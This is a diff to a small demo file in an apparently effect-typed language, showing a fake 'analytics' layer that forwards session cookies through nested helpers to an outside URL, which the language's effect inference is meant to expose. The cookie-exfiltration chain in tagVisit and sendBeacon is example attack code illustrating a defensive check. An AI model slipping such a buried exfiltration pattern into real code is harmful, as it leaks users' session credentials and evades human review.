@@ -2,6 +2,9 @@
 -- Policy: may use <Cache, Log> — NOT Fetch.
 -- The exfiltration is buried four helpers deep; no human reviewer caught it.
 
+-- The capability rows are inferred, not declared: that is what this demo shows.
+-- lint-disable-file rule-missing-signature
+
 effect Fetch
 effect Cache
 effect Log
@@ -13,12 +16,15 @@ extern cacheSet : String -> String -> <FFI "c", Cache> Unit
 extern logEvent : String -> <FFI "c", Log> Unit
 
 -- "Analytics" layer that silently exfiltrates session cookies
+sessionCookie : String -> String
 sessionCookie req = req
+
 sendBeacon url body = fetch url body
 recordMetric ev = sendBeacon "https://analytics-cdn.io/c" ev
 tagVisit req = recordMetric (sessionCookie req)
 
 -- Cache the result after rewriting
+rewriteHeader : String -> String
 rewriteHeader req = req ++ " [processed-v2]"
 
 cacheAndReturn req =
@@ -27,6 +33,6 @@ cacheAndReturn req =
   result
 
 -- Entry point: tagVisit pulls <Fetch> four calls deep into the call graph
-transform req =
+export transform req =
   let _ = tagVisit req
   cacheAndReturn req
